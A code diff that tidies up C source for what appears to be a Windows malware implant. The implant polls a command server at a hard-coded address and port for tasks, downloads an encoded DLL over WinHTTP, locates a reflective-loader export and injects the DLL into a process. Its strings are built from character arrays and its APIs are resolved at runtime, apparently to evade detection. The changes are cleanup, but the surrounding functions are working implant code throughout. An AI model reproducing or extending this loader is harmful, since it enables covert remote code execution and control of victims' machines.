@@ -223,8 +223,7 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     WCHAR wProxy[] = { 'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0 };
     WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
 
-    INTERNET_PORT dwPort = 5001;
-    DWORD dwBufferSize;
+    DWORD dwBufferSize = 0;
 
     HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
     (
@@ -353,7 +352,9 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     }
 
     if (result)
-    { dwBufferSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength); }
+    {
+        dwBufferSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
+    }
     else
     {
         #ifdef DEBUG
@@ -367,7 +368,7 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     DWORD availableBytes = 0;
     DWORD actuallyRead = 0;
     LPDWORD lpActuallyRead = &actuallyRead;
-    BOOL readSuccess ;
+    BOOL readSuccess = FALSE;
 
     while(((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0)
     {
@@ -469,8 +470,6 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
 
     WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
 
-    WCHAR wUuid[] = { '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
-
     /*
     // Home
     WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '2', '0', 0 };
@@ -486,7 +485,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
 
     INTERNET_PORT dwPort = 5001;
-    DWORD dwEncodedDllSize;
+    DWORD dwEncodedDllSize = 0;
 
     HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
     (
@@ -634,7 +633,6 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
   
     while( ((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0 )
     {
-        //printf("Available Bytes: %d\n", availableBytes);
         BOOL readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
         (
             hRequest,
@@ -642,6 +640,14 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
             availableBytes,
             lpActuallyRead
         );
+
+        if (!readSuccess)
+        {
+            #ifdef DEBUG
+            CHAR whrdFailed[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 'F' };
+            ((MESSAGEBOXA)api->MessageBoxA)(0, whrdFailed, whrdFailed, 0x0L);
+            #endif
+        }
 
         // Check for buffer overflow risk
         if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwEncodedDllSize / sizeof(WCHAR))
@@ -710,9 +716,7 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll)
     UINT_PTR functionNameAddresses;
     UINT_PTR functionOrdinals;
     UINT_PTR functionAddresses;
-    UINT_PTR nameRva;
-    UINT_PTR nameAdr;
-    UINT_PTR rlAddress;
+    UINT_PTR rlAddress = 0;
 
     dwNumberOfEntries = ((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->NumberOfNames;
     #ifdef DEBUG
@@ -768,7 +772,10 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll)
         }
     }
 
-    return rlAddress;
+    if (rlAddress)
+    { return rlAddress; }
+    else
+    { return 0; }
 }
 
 HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize)
@@ -909,7 +916,7 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid)
     *uuid = myEndTrim(*uuid, ',');
     *uuid = myTrim(*uuid, '"');
 
-    myStrtok(NULL, NULL, TRUE);
+    myStrtok(NULL, 0, TRUE);
     return task;
 }
 
@@ -1033,10 +1040,8 @@ void myMain()
 
     WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
     WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
-    WCHAR sendOutputPath[] = { '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/', 0 };
     WCHAR uuid[] = { '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
     WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
-    WCHAR* fullPath2;
     INTERNET_PORT port = 5001;
 
     CHAR* jsonResponse;
@@ -1056,7 +1061,6 @@ void myMain()
     };
     DWORD totalJsonSize;
     CHAR* json;
-    CHAR exit[] = { 'e', 'x', 'i', 't', 0 };
 
     while (TRUE)
     {
